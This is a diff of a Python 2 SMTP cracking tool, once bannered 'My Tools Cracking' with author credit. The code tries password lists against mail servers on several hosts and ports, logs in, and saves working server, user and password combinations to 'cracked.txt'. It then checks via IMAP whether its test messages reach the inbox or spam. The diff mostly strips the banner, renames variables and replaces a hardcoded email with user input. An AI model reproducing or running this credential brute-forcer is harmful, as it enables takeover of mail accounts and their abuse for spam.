@@ -1,42 +1,9 @@
 import socket,threading,base64,datetime,sys,ssl,imaplib,time,re
-print ('''\033[1;34mAuthor \033[91m:\033[37m Boychongzen aka Xroot \033[1;34m          
-
-       
-         ______     ______  _______  _________________     _____                                                  
-     ___|\     \   |      \/       \/                 \___|\    \                                                 
-    |    |\     \ /          /\     \______     ______|    |\    \                                                
-    |    |/____/|/     /\   / /\     | \( /    /  )/  |    | |    |                                               
- ___|    \|   | /     /\ \_/ / /    /|  ' |   |   '   |    |/____/|                                               
-|    \    \___||     |  \|_|/ /    / |    |   |       |    ||    ||                                               
-|    |\     \  |     |       |    |  |   /   //       |    ||____|/                                               
-|\ ___\|_____| |\____\       |____|  /  /___//        |____|                                                      
-| |    |     | | |    |      |    | /  |`   |         |    |                                                      
- \|____|_____|  \|____|      |____|/   |____|         |____|                                                      
-    \(    )/       \(          )/        \(             \(                                                        
-     '    '       _____       _____       ' ____        _____   ____    ____  ____ _____   ______        _____    
-              ___|\    \  ___|\    \   ____|\   \   ___|\    \ |    |  |    ||    |\    \ |\     \   ___|\    \   
-             /    /\    \|    |\    \ /    /\    \ /    /\    \|    |  |    ||    |\\    \| \     \ /    /\    \  
-            |    |  |    |    | |    |    |  |    |    |  |    |    | /    //|    | \|    \  \     |    |  |____| 
-            |    |  |____|    |/____/|    |__|    |    |  |____|    |/ _ _// |    |  |     \  |    |    |    ____ 
-            |    |   ____|    |\    \|    .--.    |    |   ____|    |\    \' |    |  |      \ |    |    |   |    |
-            |    |  |    |    | |    |    |  |    |    |  |    |    | \    \ |    |  |    |\ \|    |    |   |_,  |
-            |\ ___\/    /|____| |____|____|  |____|\ ___\/    /|____|  \____\|____|  |____||\_____/|\ ___\___/  /|
-            | |   /____/ |    | |    |    |  |    | |   /____/ |    |   |    |    |  |    |/ \|   || |   /____ / |
-             \|___|    | |____| |____|____|  |____|\|___|    | |____|   |____|____|  |____|   |___|/\|___|    | / 
-               \( |____|/  \(     )/   \(      )/    \( |____|/  \(       )/   \(      \(       )/    \( |____|/  
-                '   )/      '     '     '      '      '   )/      '       '     '       '       '      '   )/     
-                    '                                     '                                                '        
-
-
- ''')
-print"\033[1;31mEksekusi \033[1;34m: \033[1;37m[Windows]python \033[1;31m& \033[1;37m[Termux]python2 \033[1;34mcracking.py list.txt"
-
-print ('\033[1;31m--------------------------------------------\033[1;34m( \033[1;33mWELCOME My Tools Cracking \033[1;34m)\033[1;31m-----------------------------------------------\033[1;m\n')
 try:
 	import Queue
 except:
 	import queue as Queue
-azby=raw_input('\033[1;34m[+]  \033[1;34mYour Email Cuks: ')
+azby=raw_input('[+] Enter Your Email : ')
 katous='ail.com'
 to_check={}
 class IMAP4_SSL(imaplib.IMAP4_SSL):
@@ -129,11 +96,11 @@ class checkerr(threading.Thread):
 			times=time.time()-t[1]
 			if times-2>self.timeout:
 				
-				open('Cracked_Cuks.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
+				open('checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
 				found.append(k)
 				
 			if len(rez)>0:
-				open('Cracked_Cuks.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
+				open('checked.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
 				found.append(k)
 		self.i.select(self.spam)
 		for k,t in enumerate(to_check):
@@ -141,10 +108,10 @@ class checkerr(threading.Thread):
 			times=time.time()-t[1]
 			if times-2>self.timeout:
 				
-				open('Cracked_Cuks.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
+				open('checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
 				found.append(k)
 			if len(rez)>0:
-				open('Cracked_Cuks.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
+				open('checked.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
 				found.append(k)
 		new=[]
 		for k,v in enumerate(to_check):
@@ -192,8 +159,8 @@ class consumer(threading.Thread):
 	def __init__(self,qu):
 		threading.Thread.__init__(self)
 		self.q=qu
-		self.hosts=["","smtp.","smtp.gmail.","mail.","webmail."]
-		self.ports=[465,587,857,25]
+		self.hosts=["","smtp.","mail.","webmail."]
+		self.ports=[587,465,25]
 
 		self.timeout=13
 
@@ -233,7 +200,7 @@ class consumer(threading.Thread):
 			for j,h in enumerate(self.hosts):
 				
 				try:
-					print '\033[1;31m[*] Trying connection on '+h+host+':'+str(p)
+					print '[*] Trying connection on '+h+host+':'+str(p)
 
 					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					s.setblocking(0)
@@ -288,13 +255,13 @@ class consumer(threading.Thread):
 		return passw
 
 	def connect(self,tupple,ssl=False):
-		global bads,Cracked_Cuks,cache,email,successful
+		global bads,cracked,cache,email,successful
 		
 		host=tupple[0].rstrip()
 		host1=host
 		user=tupple[1].rstrip()
 		
-		if host1 in Cracked_Cuks or host1 in bads:
+		if host1 in cracked or host1 in bads:
 			return 0
 		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
 		if passw==None:
@@ -313,7 +280,7 @@ class consumer(threading.Thread):
 		if port=="465":
 			port+="(SSL)"
 		host=self.hosts[cache[host][0]]+host
-		print '\033[1;37m[+] HACKED YOUR EMAIL CUKS \033[1;37m'+host+":"+port+" "+user+" "+passw 
+		print '[+] Trying '+host+":"+port+" "+user+" "+passw
 		try:
 			
 			banner=s.recv(1024)
@@ -343,9 +310,9 @@ class consumer(threading.Thread):
 				self.sendCmd(s,'QUIT')
 				s.close()
 				return 0
-			print '\033[1;37m[!] HACKED YOUR EMAIL CUKS \033[1;31m'+host+':'+port+' '+user+' '+passw
-			open('Cracked_Cuks.txt','a').write(host+":"+port+","+user+","+passw+"\n")
-			Cracked_Cuks.append(host1)
+			print '[!] WOLFS AUAUAUUAAU '+host+':'+port+' '+user+' '+passw
+			open('cracked.txt','a').write(host+":"+port+","+user+","+passw+"\n")
+			cracked.append(host1)
 				
 			rez=self.sendCmd(s,"RSET")
 			if rez[0:3]!='250':
@@ -404,10 +371,11 @@ quee=Queue.Queue(maxsize=20000)
 tld=open('tlds.txt','r').read().splitlines()
 tlds=cache={}
 bads=[]
-Cracked_Cuks=[]
+cracked=[]
 rbads=0
-#to 
-email='ahmad.anurrohman@gmail.com' 
+email=azby
+
+ 
 try:
 
 	passwords=open('pwd','r').read().splitlines()
@@ -437,7 +405,7 @@ def part():
 	for i in tld:
 		tlds[i]=i
 part()
-print '\033[1;31m[+] Loaded All Email Cuks'
+print '[+] All files loaded'
 
 
 for i in range(int(sys.argv[2])):
@@ -450,7 +418,7 @@ for i in range(int(sys.argv[2])):
 		break
 if option=='3':
 	pass
-	#checking Cracked_Cuks
+	#checking cracked
 elif option=='2':
 	#list of emails and password
 	for i in inputs:
